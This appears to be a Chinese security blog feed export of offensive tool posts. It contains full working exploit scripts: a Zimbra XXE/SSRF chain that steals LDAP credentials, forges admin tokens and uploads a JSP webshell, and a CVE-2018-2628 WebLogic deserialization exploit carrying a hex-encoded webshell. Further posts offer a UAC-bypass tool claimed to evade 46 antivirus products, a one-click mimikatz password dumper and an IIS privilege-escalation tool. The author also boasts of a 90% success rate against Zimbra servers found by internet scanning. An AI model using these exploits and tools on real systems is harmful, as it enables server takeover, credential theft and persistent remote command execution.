<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">导致服务器信息泄露</span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁程度</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">高</span></p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h3 style="margin: 0px; padding: 0px; font-weight: normal; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: arial, sans-serif; color: black;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; font-size: 19px; line-height: 21.85px; font-family: 宋体; color: black; letter-spacing: 0px;">漏洞描述：</span></span></h3>
<p><span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体; font-size: 15px;"><span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">当<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;Zimbra&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">存在像任意文件读取、<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">XXE<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">（<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">外部实体注入）<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">这种漏洞时，攻击者可以利用此漏洞读取<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;localconfig.xml<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">配置文件，获取到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;zimbra admin ldap password<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">，并通过<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;7071 admin&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">端口进行<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;SOAP AuthRequest&nbsp;<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体; letter-spacing: 0px;">认证，得到<span style="margin: 0px; padding: 0px; font-variant-numeric: normal; font-stretch: normal; line-height: 14.95px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; letter-spacing: 0px;">&nbsp;admin authtoken</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>漏洞是利用XXE<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">和ProxyServlet SSRF&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">漏洞拿到&nbsp;admin authtoken&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">服务端打来Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">缓存服务是，<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">可以利用SSRF<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">攻击进行反序列化执行远程代码。不过由于Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">在单服务器安装中尽管Memcached<span style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; font-family: 宋体;">虽然启动但是并没有进行使用，所以其攻击场景受到限制。</span></span></span></span></span></span></span></span></span></span></p>
<p><strong>影响版本：</strong></p>
<div class="cnblogs_Highlighter">
<pre class="brush:bash;gutter:true;"><span style="font-size: 15px;">ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：

<ol>
<li><p>Zimbra &lt; 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。</p>
</li>
<li><p>Zimbra &lt; 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。<br></p></li></ol></span></pre><p></p>
</div>
<p><strong>&nbsp;GetShell代码</strong></p>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;">#coding=utf8
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
base_url=sys.argv[1]
base_url=base_url.rstrip("/")
#upload file name and content
#modify by k8gege
#Connect "shell.jsp" using K8fly CmdShell
#Because the CMD parameter is encrypted using Base64(bypass WAF)
filename = "shell.jsp"
fileContent = r'&lt;%@page import="java.io.*"%&gt;&lt;%@page import="sun.misc.BASE64Decoder"%&gt;&lt;%try {String cmd = request.getParameter("tom");String path=application.getRealPath(request.getRequestURI());String dir="weblogic";if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("-&gt;|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|&lt;-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%&gt;'
print(base_url)
#dtd file url
dtd_url="https://k8gege.github.io/zimbra.dtd"
"""
&lt;!ENTITY % file SYSTEM "file:../conf/localconfig.xml"&gt;
&lt;!ENTITY % start "&lt;![CDATA["&gt;
&lt;!ENTITY % end "]]&gt;"&gt;
&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;
"""
xxe_data = r"""&lt;!DOCTYPE Autodiscover [
     &lt;!ENTITY % dtd SYSTEM "{dtd}"&gt;
     %dtd;
     %all;
     ]&gt;
&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"&gt;
 &lt;Request&gt;
     &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;
     &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;
 &lt;/Request&gt;
&lt;/Autodiscover&gt;""".format(dtd=dtd_url)



<p>#XXE stage<br>headers = {<br>    “Content-Type”:”application/xml”<br>}<br>print(“[*] Get User Name/Password By XXE “)<br>r = requests.post(base_url+”/Autodiscover/Autodiscover.xml”,data=xxe_data,headers=headers,verify=False,timeout=15)<br>#print r.text<br>if ‘response schema not available’ not in r.text:<br>    print(“have no xxe”)<br>    exit()</p>
<p>#low_token Stage<br>import re<br>pattern_name = re.compile(r”&lt;key name=(&quot;|”)zimbra_user(&quot;|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;”)<br>pattern_password = re.compile(r”&lt;key name=(&quot;|”)zimbra_ldap_password(&quot;|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;”)<br>username = pattern_name.findall(r.text)[0][2]<br>password = pattern_password.findall(r.text)[0][2]<br>print(username)<br>print(password)</p>
<p>auth_body=”””&lt;soap:Envelope xmlns:soap=”<a href="http://www.w3.org/2003/05/soap-envelope&quot;" target="_blank" rel="noopener">http://www.w3.org/2003/05/soap-envelope&quot;</a>&gt;<br>   &lt;soap:Header&gt;<br>       &lt;context xmlns=”urn:zimbra”&gt;<br>           &lt;userAgent name=”ZimbraWebClient - SAF3 (Win)” version=”5.0.15_GA_2851.RHEL5_64”/&gt;<br>       &lt;/context&gt;<br>   &lt;/soap:Header&gt;<br>   &lt;soap:Body&gt;<br>     &lt;AuthRequest xmlns=”{xmlns}”&gt;<br>        &lt;account by=”adminName”&gt;{username}&lt;/account&gt;<br>        &lt;password&gt;{password}&lt;/password&gt;<br>     &lt;/AuthRequest&gt;<br>   &lt;/soap:Body&gt;<br>&lt;/soap:Envelope&gt;<br>“””<br>print(“[*] Get Low Privilege Auth Token”)<br>r=requests.post(base_url+”/service/soap”,data=auth_body.format(xmlns=”urn:zimbraAccount”,username=username,password=password),verify=False)</p>
<p>pattern_auth_token=re.compile(r”&lt;authToken&gt;(.*?)&lt;/authToken&gt;”)</p>
<p>low_priv_token = pattern_auth_token.findall(r.text)[0]</p>
<p>#print(low_priv_token)</p>
<h1 id="SSRF-Get-Admin-Token-Stage"><a href="#SSRF-Get-Admin-Token-Stage" class="headerlink" title="SSRF+Get Admin_Token Stage"></a>SSRF+Get Admin_Token Stage</h1><p>headers[“Cookie”]=”ZM_ADMIN_AUTH_TOKEN=”+low_priv_token+”;”<br>headers[“Host”]=”foo:7071”<br>print(“[*] Get Admin  Auth Token By SSRF”)<br>r = requests.post(base_url+”/service/proxy?target=<a href="https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False" target="_blank" rel="noopener">https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False</a>)</p>
<p>admin_token =pattern_auth_token.findall(r.text)[0]<br>#print(“ADMIN_TOKEN:”+admin_token)</p>
<p>f = {<br>    ‘filename1’:(None,”whocare”,None),<br>    ‘clientFile’:(filename,fileContent,”text/plain”),<br>    ‘requestId’:(None,”12”,None),<br>}</p>
<p>headers ={<br>    “Cookie”:”ZM_ADMIN_AUTH_TOKEN=”+admin_token+”;”<br>}<br>print(“[<em>] Uploading file”)<br>r = requests.post(base_url+”/service/extension/clientUploader/upload”,files=f,headers=headers,verify=False)<br>#print(r.text)<br>print(“Shell: “+base_url+”/downloads/“+filename)<br>#print(“Connect &quot;shell.jsp&quot; using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)”)<br>print(“[</em>] Request Result:”)<br>s = requests.session()<br>r = s.get(base_url+”/downloads/“+filename,verify=False,headers=headers)<br>#print(r.text)<br>print(“May need cookie:”)<br>print(headers[‘Cookie’])<br></p></pre><p></p>
</div>
<p>&nbsp;</p>
<p><strong><span style="font-size: 16px;">配合Cscan使用(批量使用url.txt) </span><br></strong></p>
<p>Cscan.ini配置如下</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra1.png"></p>
<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra2.png"></p>
<p>Cscan扫禁ping机器需加nocheck参数</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra3.png"></p>
<p><strong><span style="font-size: 16px;">钟馗之眼随便抓一些Zimbra来测试，发现成功率高达90%</span></strong></p>
<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra4.png"></p>
<p>&nbsp;</p>
<p><strong>下载</strong></p>
<p>EXP: <a href="https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py</a></p>
<p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
<p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>GetShell</tag>
        <tag>Zimbra</tag>
      </tags>
  </entry>
  <entry>
    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
    <url>/p/41e1c61c.html</url>
    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
<p>工具: k8uac<br>编译: VC++</p>
<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
<p>示例如下:</p>
<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
      <categories>
        <category>提权</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>BypassUAC</tag>
      </tags>
  </entry>
  <entry>
    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
    <url>/p/77429fa6.html</url>
    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
<p>结果保存于当前目录mz.log</p>
<p>EXE</p>
<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
<p>PowerShell</p>
<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
      <categories>
        <category>提权</category>
        <category>工具</category>
        <category>密码</category>
        <category>PowerShell</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>PowerShell</tag>
        <tag>mimikatz</tag>
      </tags>
  </entry>
  <entry>
    <title>全版本IIS提权工具iislpe</title>
    <url>/p/6b9b3afe.html</url>
    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
<p><strong>原理:</strong></p>
<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
<p><strong>用法:</strong></p>
<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
<p>&nbsp;</p>
<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
<p>&nbsp; &nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
      <categories>
        <category>提权</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>LPE</tag>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
    <url>/p/b8e58f69.html</url>
    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
<hr>
<ul>
<li>漏洞威胁：RCE--远程代码执行</li>
<li>漏洞组件：weblogic</li>
<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
</ul>
<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)

<p>from <strong>future</strong> import print_function</p>
<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
<pre><code>rs=send_payload_objdata(sock, payload)
#print(&apos;response: &apos; + rs)
print(&apos;exploit completed!&apos;)
print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
<pre><code>dip = sys.argv[1]
dport = int(sys.argv[2])
exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
</div>
<h2>&nbsp;演示:</h2>
<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
<h2>附件说明:</h2>
<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
